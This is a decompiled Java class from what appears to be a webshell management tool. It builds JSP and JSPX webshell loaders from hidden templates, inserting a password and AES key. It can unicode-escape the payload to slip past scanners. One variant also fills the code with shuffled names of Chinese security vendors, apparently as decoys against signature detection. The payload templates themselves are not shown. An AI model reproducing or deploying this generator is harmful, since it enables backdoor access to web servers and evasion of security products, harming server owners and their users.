/*
 * Decompiled with CFR 0.153-SNAPSHOT (d6f6758-dirty).
 */
package shells.cryptions.JavaAes;

import core.ApplicationContext;
import core.ui.component.dialog.GOptionPane;
import java.io.InputStream;
import java.util.Random;

import util.Log;
import util.functions;

class Generate {
    private static final String[] SUFFIX = new String[]{"jsp", "jspx"};

    Generate() {
    }

    public static byte[] GenerateShellLoder(String shellName, String pass, String secretKey, boolean isBin) {
        byte[] data = null;
        try {
            InputStream inputStream = Generate.class.getResourceAsStream("template/" + shellName + (isBin ? "raw" : "base64") + "GlobalCode.bin");
            String globalCode = new String(functions.readInputStream(inputStream));
            inputStream.close();
            globalCode = globalCode.replace("{pass}", pass).replace("{secretKey}", secretKey);
            inputStream = Generate.class.getResourceAsStream("template/" + shellName + (isBin ? "raw" : "base64") + "Code.bin");
            String code = new String(functions.readInputStream(inputStream));
            inputStream.close();
            Object selectedValue = GOptionPane.showInputDialog(null, "suffix", "selected suffix", 1, null, SUFFIX, null);
            if (selectedValue != null) {
                String suffix = (String)selectedValue;
                inputStream = Generate.class.getResourceAsStream("template/shell." + suffix);
                String template = new String(functions.readInputStream(inputStream));
                inputStream.close();
                if (suffix.equals(SUFFIX[1])) {
                    globalCode = globalCode.replace("<", "&lt;").replace(">", "&gt;");
                    code = code.replace("<", "&lt;").replace(">", "&gt;");
                }
                template = ApplicationContext.isGodMode() ? template.replace("{globalCode}", functions.stringToUnicode(globalCode)).replace("{code}", functions.stringToUnicode(code)) : template.replace("{globalCode}", globalCode).replace("{code}", code);
                data = template.getBytes();
            }
        } catch (Exception e) {
            Log.error(e);
        }
        return data;
    }

    public static byte[] GenerateShellLodermessage(String shellName, String pass, String secretKey, boolean isBin) {
        byte[] data = null;
        try {
            String[] arr = { "qianxin", "nsfocus", "sangfor", "dbappsecurity", "chaitin", "damddos", "alibaba", "baidu" ,"leadsec", "venustech",
                    "asiainfosec","qingteng","threatbook","antiy","dptech","hillstonenet","topsec","huawei","sina","webray",
                    "tencent","bytedance","douyin","westone"};
            shuffle(arr);

            InputStream inputStream = Generate.class.getResourceAsStream("template/" + shellName + (isBin ? "raw" : "base64") + "GlobalCodemessage.bin");
            String globalCode = new String(functions.readInputStream(inputStream));
            inputStream.close();

            //globalCode = globalCode.replace("{pass}", pass).replace("{secretKey}", secretKey);
            globalCode = globalCode
                    .replace("{pass}", functions.base64EncodeToString(pass.getBytes()))
                    .replace("{secretKey}", functions.base64EncodeToString(secretKey.getBytes()))
                    .replace("{stryi}", arr[0]).replace("{strer}", arr[1])
                    .replace("{strsan}", arr[2]).replace("{strsi}", arr[3])
                    .replace("{strwu}", arr[4]).replace("{strliu}", arr[5])
                    .replace("{strqi}", arr[6]).replace("{strba}", arr[7])
                    .replace("{strjiu}", arr[8]).replace("{strshi}", arr[9])
                    .replace("{strshiyi}", arr[10]).replace("{strshier}", arr[11])
                    .replace("{strshisan}", arr[12]).replace("{strshisi}", arr[13])
                    .replace("{strshiwu}", arr[14]).replace("{strshiliu}", arr[15])
                    .replace("{strshiqi}", arr[16]).replace("{strshiba}", arr[17])
                    .replace("{strshijiu}", arr[18]).replace("{strershi}", arr[19])
                    .replace("{strershiyi}", arr[20]).replace("{strershier}", arr[21])
                    .replace("{strershisan}", arr[22]).replace("{strershisi}", arr[23]);

            inputStream = Generate.class.getResourceAsStream("template/" + shellName + (isBin ? "raw" : "base64") + "Codemessage.bin");
            String code = new String(functions.readInputStream(inputStream));

            inputStream.close();
            code = code.replace("{stryi}", arr[0]).replace("{strer}", arr[1])
                    .replace("{strsan}", arr[2]).replace("{strsi}", arr[3])
                    .replace("{strwu}", arr[4]).replace("{strliu}", arr[5])
                    .replace("{strqi}", arr[6]).replace("{strba}", arr[7])
                    .replace("{strjiu}", arr[8]).replace("{strshi}", arr[9])
                    .replace("{strshiyi}", arr[10]).replace("{strshier}", arr[11])
                    .replace("{strshisan}", arr[12]).replace("{strshisi}", arr[13])
                    .replace("{strshiwu}", arr[14]).replace("{strshiliu}", arr[15])
                    .replace("{strshiqi}", arr[16]).replace("{strshiba}", arr[17])
                    .replace("{strshijiu}", arr[18]).replace("{strershi}", arr[19])
                    .replace("{strershiyi}", arr[20]).replace("{strershier}", arr[21])
                    .replace("{strershisan}", arr[22]).replace("{strershisi}", arr[23]);


            Object selectedValue = GOptionPane.showInputDialog(null, "suffix", "selected suffix", 1, null, SUFFIX, null);
            if (selectedValue != null) {
                String suffix = (String)selectedValue;
                inputStream = Generate.class.getResourceAsStream("template/shell." + suffix);
                String template = new String(functions.readInputStream(inputStream));
                inputStream.close();
                if (suffix.equals(SUFFIX[1])) {
                    globalCode = globalCode.replace("<", "&lt;").replace(">", "&gt;");
                    code = code.replace("<", "&lt;").replace(">", "&gt;");
                }
                template = ApplicationContext.isGodMode() ? template.replace("{globalCode}", functions.stringToUnicode(globalCode)).replace("{code}", functions.stringToUnicode(code)) : template.replace("{globalCode}", globalCode).replace("{code}", code);
                data = template.getBytes();
            }
        } catch (Exception e) {
            Log.error(e);
        }
        return data;
    }

    private static Random rand = new Random();

    public static <T> void swap(T[] a, int i, int j) {
        T temp = a[i];
        a[i] = a[j];
        a[j] = temp;
    }

    public static <T> void shuffle(T[] arr) {
        int length = arr.length;
        for (int i = length; i > 0; i--) {
            int randInd = rand.nextInt(i);
            swap(arr, randInd, i - 1);
        }
    }
    public static byte[] GenerateShellLodermessage(String pass, String secretKey, boolean isBin) {
        return Generate.GenerateShellLodermessage("", pass, secretKey, isBin);
    }
    public static byte[] GenerateShellLoder(String pass, String secretKey, boolean isBin) {
        return Generate.GenerateShellLoder("", pass, secretKey, isBin);
    }
}

